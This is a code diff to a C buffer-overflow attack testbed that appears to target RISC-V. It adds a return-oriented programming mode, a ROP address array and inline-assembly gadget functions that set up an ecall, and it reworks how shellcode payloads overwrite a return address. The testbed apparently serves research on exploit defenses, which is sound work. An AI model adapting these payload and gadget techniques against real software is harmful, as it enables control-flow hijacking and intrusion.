@@ -31,7 +31,12 @@ const size_t size_createfile_shellcode = sizeof(createfile_shellcode);
 
 ATTACKFORM attack;
 
+
+
 CHARPAYLOAD payload;
+
+static char cf_ret_param[] = "urhacked";
+static int rop_sled[7] = {0xBEEEEEEF, 0xFFFFFFFF, 0xBEEEEEEF, 0xBEEFFEEB, 0xFFFFFFFF, 0xBEEEEEEF, 0xABCDEFAB};
 
 void fooz() {
   printf("fooz was called\n");
@@ -68,6 +73,9 @@ int main(int argc, char **argv) {
     case 't':
       set_technique(optarg);
       break;
+    case 'i':
+      set_inject_param(optarg);
+      break;
     case 'c':
       set_code_ptr(optarg);
       break;
@@ -96,17 +104,29 @@ int main(int argc, char **argv) {
 
 char* generate_payload() {
 
+  //set payload contents to shellcode, or dummy value if not needed
+  switch(attack.technique) {
+    case CREATE_FILE:
+      payload.contents = createfile_shellcode;
+      payload.size = size_createfile_shellcode;
+      break;
+    case RETURN_ORIENTED_PROGRAMMING:
+      payload.contents = "dummy";
+      payload.size = 0;
+      break;
+  }
+
+
   size_t total_size = (uintptr_t) payload.target_addr - (uintptr_t) payload.buffer + sizeof(int);
 
   char* temp_char_buffer = (char*) malloc(total_size);
-
   if(temp_char_buffer == NULL) {
     fprintf(stderr, "malloc failed\n");
   }
 
-  int overflow_ptr = (int) payload.overflow_ptr;
   memcpy(temp_char_buffer, payload.contents, payload.size);
 
+  int overflow_ptr = (int) payload.overflow_ptr;
   char* tc_ra_location = (char*) ((uintptr_t) temp_char_buffer + total_size - sizeof(int));
   memcpy(tc_ra_location, &overflow_ptr, sizeof(int));
 
@@ -176,11 +196,9 @@ void perform_attack(void (*stack_func_ptr_param)(), jmp_buf stack_jmp_buf_param)
   struct attackme* heap_struct = (struct attackme*) malloc(sizeof(struct attackme));
   heap_struct->func_ptr = &fooz;
 
-  attack.technique = INDIRECT;
-  attack.code_ptr = LONGJMP_BUF_DATA;
-  attack.location = STACK;
-
-  payload.size = size_createfile_shellcode;
+  //attack.technique = INDIRECT;
+  //attack.code_ptr = LONGJMP_BUF_DATA;
+  //attack.location = STACK;
 
   static struct attackme bss_struct = {"AAAAAAAA", &fooz};
 
@@ -307,7 +325,9 @@ void perform_attack(void (*stack_func_ptr_param)(), jmp_buf stack_jmp_buf_param)
    }
   }
 
-  payload.contents = createfile_shellcode;
+  if(attack.technique == RETURN_ORIENTED_PROGRAMMING) {
+    payload.overflow_ptr = rop_sled;
+  }
 
   char* temp_char_buffer = generate_payload(&fooz);
   write_to_buffer(temp_char_buffer);
@@ -350,10 +370,6 @@ void perform_attack(void (*stack_func_ptr_param)(), jmp_buf stack_jmp_buf_param)
         break;
     }
   }
-
-  payload.contents = createfile_shellcode;
-
-  generate_payload(&fooz);
 }
 
 
@@ -437,6 +453,11 @@ boolean is_attack_possible() {
       break;  
   }
 
+  if(attack.inject_param == RETURN_ORIENTED_PROGRAMMING &&
+      (attack.technique != DIRECT || attack.code_ptr != RET_ADDR)){
+    fprintf(stderr,"Error: Impossible...for now at least :)\n");
+    return FALSE;
+  }
   return TRUE;
 }
 
@@ -448,6 +469,19 @@ void set_technique(char *choice) {
   } else {
     fprintf(stderr, "Error: Unknown choice of technique \"%s\"\n",
 	    choice);
+    exit(1);
+  }
+}
+
+void set_inject_param(char *choice) {
+  if(strcmp(choice, opt_inject_params[4]) == 0) {
+    attack.inject_param = CREATE_FILE;
+  } else if(strcmp(choice, opt_inject_params[5]) == 0) {
+    attack.inject_param = RETURN_ORIENTED_PROGRAMMING;
+  } else {
+    fprintf(stderr, "Error: Unknown choice of technique \"%s\"\n",
+      choice);
+    exit(1);
   }
 }
 
@@ -528,4 +562,36 @@ void set_function(char *choice) {
 	      choice);
     exit(1);
   }
+}
+
+void gadget1(int a, int b){
+  int aman,nick,j;
+  aman = a + b / 42;
+  for(j=0;j<10;j++);
+  asm("nop");
+  asm("auipc a0,0x0");
+  asm("addi a0,a0,28");
+  asm("li a1,577");
+  return;
+}
+
+void gadget2(int a, int b){
+  int chloe,j;
+  chloe = a + b / 43;
+  for(j=0;j<10;j++);
+  asm("nop");
+  asm("slli    a2,a2,0x4");
+  asm("addi    s0,sp,444");
+  asm("li      a3,0");
+  asm("li      a7,1024");
+  return;
+}
+
+int gadget3(int a, int b){
+  int baris,j;
+  baris = a + b / 44;
+  for(j=0;j<10;j++);
+  asm("nop");
+  asm("ecall");
+  return 42;
 }
